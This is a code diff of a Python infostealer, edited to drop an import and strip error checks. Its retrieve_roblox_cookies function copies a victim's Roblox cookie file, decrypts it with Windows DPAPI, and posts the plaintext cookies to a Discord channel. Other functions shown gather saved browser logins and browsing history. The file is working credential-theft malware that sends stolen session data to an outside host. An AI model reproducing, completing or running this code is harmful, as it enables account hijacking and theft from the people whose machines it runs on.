@@ -14,7 +14,6 @@ import requests
 import tempfile
 import platform
 import psutil
-import cpuinfo
 import GPUtil
 import socket
 import getpass
@@ -230,10 +229,6 @@ def retrieve_roblox_cookies():
     user_profile = os.getenv("USERPROFILE", "")
     roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
 
-    if not os.path.exists(roblox_cookies_path):
-        send_to_discord("⚠️ robloxcookies.dat not found.")
-        return
-
     temp_dir = os.getenv("TEMP", "")
     destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
     shutil.copy(roblox_cookies_path, destination_path)
@@ -243,20 +238,12 @@ def retrieve_roblox_cookies():
             file_content = json.load(file)
 
         encoded_cookies = file_content.get("CookiesData", "")
-        if not encoded_cookies:
-            send_to_discord("⚠️ No 'CookiesData' found in the file.")
-            return
 
         decoded_cookies = base64.b64decode(encoded_cookies)
         decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
         decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
 
         send_to_discord(f"Decrypted Roblox Cookies:\n```\n{decrypted_text}\n```")
-
-    except json.JSONDecodeError as e:
-        send_to_discord(f"❌ JSON parsing error: {e}")
-    except Exception as e:
-        send_to_discord(f"❌ Unexpected error: {e}")
 
 def get_login_data_path(browser):
     try:
@@ -367,7 +354,7 @@ def collect_browser_logins(browser):
 def get_browser_history(browser, limit=100):
     original_path = get_history_path(browser)
     if not original_path or not os.path.exists(original_path):
-        return "History path not found for browser."
+        return
 
     temp_path = os.path.join(tempfile.gettempdir(), f"{browser}_history_copy")
 
